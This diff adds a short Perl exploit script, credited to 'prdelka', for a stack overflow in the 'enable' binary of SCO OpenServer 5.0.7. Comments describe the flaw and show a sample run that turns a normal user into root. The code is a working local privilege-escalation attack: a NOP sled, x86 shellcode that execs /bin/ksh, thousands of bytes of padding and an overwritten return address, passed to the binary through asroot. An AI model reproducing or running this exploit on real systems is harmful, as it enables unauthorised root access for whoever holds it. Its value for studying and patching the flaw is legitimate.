@@ -1,0 +1,36 @@
+#!/usr/bin/perl
+# SCO Openserver 5.0.7 enable exploit
+# ===================================
+# A standard stack-overflow exists in the handling of
+# command line arguements in the 'enable' binary. A user
+# must be configured with the correct permissions to
+# use the "enable" binary. SCO user documentation suggests
+# "You can use the asroot(ADM) command. In order to grant a
+# user the right to enable and disable tty devices". This
+# exploit assumes you have those permissions.
+#
+# Example.
+# 
+# $ id
+# uid=200(user) gid=50(group) groups=50(group)
+# $ perl enablex.pl
+# # id
+# uid=0(root) gid=50(group) egid=18(lp) groups=50(group)
+#
+# - prdelka
+my $buffer;
+$buffer .="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"; 
+$buffer .="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"; 
+$buffer .="\x90\x90\x90\x90\x90\x90\x90\x90\x68\xff\xf8\xff\x3c\x6a\x65\x89\xe6\xf7\x56\x04\xf6\x16"; 
+$buffer .="\x31\xc0\x50\x68";
+$buffer .="/ksh";
+$buffer .="\x68";
+$buffer .="/bin"; 
+$buffer .="\x89\xe3\x50\x50\x53\xb0\x3b\xff\xd6";
+for($i = 0;$i <= 7782;$i++)
+{
+        $buffer .= "A";
+}
+$buffer .= "\x3f\x60\x04\x08";
+system("/tcb/bin/asroot","enable",$buffer);
+
